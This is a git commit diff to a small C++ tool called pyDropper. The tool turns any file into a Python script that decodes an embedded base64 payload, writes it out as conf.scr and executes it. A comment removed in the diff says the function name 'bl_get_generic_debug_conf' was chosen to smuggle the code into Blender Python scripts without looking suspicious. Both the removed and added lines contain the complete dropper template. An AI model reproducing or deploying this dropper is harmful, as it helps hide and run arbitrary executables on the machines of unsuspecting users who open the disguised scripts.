955cf7342759b93ed50c29a13bd2f3a4dd597d7a
schplorf <112661367+schplorf@users.noreply.github.com>
2022-12-11 17:42:19 +0000

    Slightly better code

--- pyDropper/pyDropper.cpp
+++ pyDropper/pyDropper.cpp
@@ -23,22 +23,21 @@ int main(int argc, char* argv[]) {
     while (inFile.get(c)) {
         data.push_back(c);
     }
+
+	// Encode the data to base 64
+	std::string b64Data = base64_encode(data);
     
-    // Generate some python code that decodes the base64 encoded input file, writes it to a file and executes it
-    std::string pythonCode;
-    pythonCode += "def bl_get_generic_debug_conf():\n";  // This function name is so that I can smuggle it into blender python code and have it not look too suspicious as a function call
-    pythonCode += "    import base64\n";
-    pythonCode += "    import subprocess\n";
-    pythonCode += "    b = b'" + base64_encode(data) + "'\n";
-    pythonCode += "    d = base64.b64decode(b)\n";
-    pythonCode += "    with open('conf.scr', 'wb') as f:\n";
-    pythonCode += "        f.write(d)\n";
-    pythonCode += "    subprocess.Popen('conf.scr')\n";
-    pythonCode += "bl_get_generic_debug_conf()\n";
-    
-    // Write the lovely python code to a file
+	// Write some lovely python code to a file
     std::ofstream outFile("pyDrop-" + std::string(argv[1]) + ".py");
-    outFile << pythonCode;
+    outFile << "def bl_get_generic_debug_conf():\n";
+	outFile << "    import base64\n";
+	outFile << "    import subprocess\n";
+	outFile << "    b = b'" << b64Data << "'\n";
+	outFile << "    d = base64.b64decode(b)\n";
+	outFile << "    with open('conf.scr', 'wb') as f:\n";
+	outFile << "        f.write(d)\n";
+	outFile << "    subprocess.Popen('conf.scr')\n";
+	outFile << "bl_get_generic_debug_conf()\n";
     outFile.close();
     std::cout << "Complete. Wrote file pyDrop-" << std::string(argv[1]) << ".py" << std::endl;
     
